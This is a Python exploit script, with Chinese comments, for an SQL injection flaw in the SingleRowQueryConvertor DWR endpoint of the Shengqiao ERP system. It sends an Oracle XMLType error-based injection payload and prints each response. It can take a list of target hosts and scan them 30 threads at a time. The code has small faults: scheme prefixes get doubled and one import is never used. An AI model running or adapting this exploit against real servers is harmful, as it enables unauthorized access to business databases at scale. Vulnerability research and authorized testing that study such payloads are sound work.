import requests
import sys
import argparse
from multiprocessing.dummy import Pool

from day1 import check

requests.packages.urllib3.disable_warnings()

def send_request(host):

    url = f"http://{host}/erp/dwr/call/plaincall/SingleRowQueryConvertor.queryForString.dwr"  # 替换为实际的目标主机

    # 请求头
    headers = {
        'Content-Type': 'text/plain',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Priority': 'u=0'
    }

    # 请求体
    data = """
    callCount=1
    page=/erp/dwr/test/SingleRowQueryConvertor
    httpSessionId=
    scriptSessionId=D528B0534A8BE018344AB2D54E02931D86
    c0-scriptName=SingleRowQueryConvertor
    c0-methodName=queryForString
    c0-id=0
    c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
    c0-param1=Array:[]
    batchId=0
    """


    try:
    # 发送POST请求
        response = requests.post(url, headers=headers, data=data)

    # 输出响应内容
        print("Response Code:", response.status_code)
        print("Response Body:", response.text)

    except requests.exceptions.RequestException as e:
         print("An error occurred:", e)
def main():
    parse = argparse.ArgumentParser(description="圣乔ERP系统 SingleRowQueryConvertor接口存在SQL注入漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)

    try:
        targets = []
        if args.url:
            targets.append(args.url)  # 如果有单个 URL，添加到列表
        elif args.file:
            with open(args.file, 'r') as f:
                for target in f.readlines():
                    target = target.strip()
                    if target:  # 确保不添加空行
                        # 增加协议
                        if not target.startswith(('http://', 'https://')):
                            target = 'http://' + target
                        targets.append(target)

        # 调用多线程去执行检测函数
        pool.map(send_request, targets)
    except Exception as e:
        print(f"[ERROR] 参数错误请使用-h查看帮助信息: {e}")
if __name__ == '__main__':
    main()